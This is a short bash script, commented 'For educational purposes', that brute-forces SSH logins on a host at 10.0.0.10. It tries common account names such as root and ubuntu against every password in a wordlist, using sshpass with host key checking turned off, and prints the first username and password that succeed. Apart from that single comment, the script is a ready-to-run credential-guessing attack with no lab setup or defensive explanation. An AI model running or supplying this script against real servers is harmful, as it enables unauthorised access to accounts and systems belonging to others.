#!/bin/bash
# For educational purposes
TARGET="10.0.0.10"
PORT="22"
USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
PASSWORD_FILE="passwords.txt"
echo "Starting SSH credential testing..."
for user in "${USERNAMES[@]}"; do
  while IFS= read -r pass; do
    echo "Testing credentials: ${user} / ${pass}"
    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
               -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
      echo "Successful login with credentials:"
      echo "Host: ${TARGET}"
      echo "Username: ${user}"
      echo "Password: ${pass}"
      exit 0
    fi
  done < "${PASSWORD_FILE}"
done
echo "No credentials worked..."
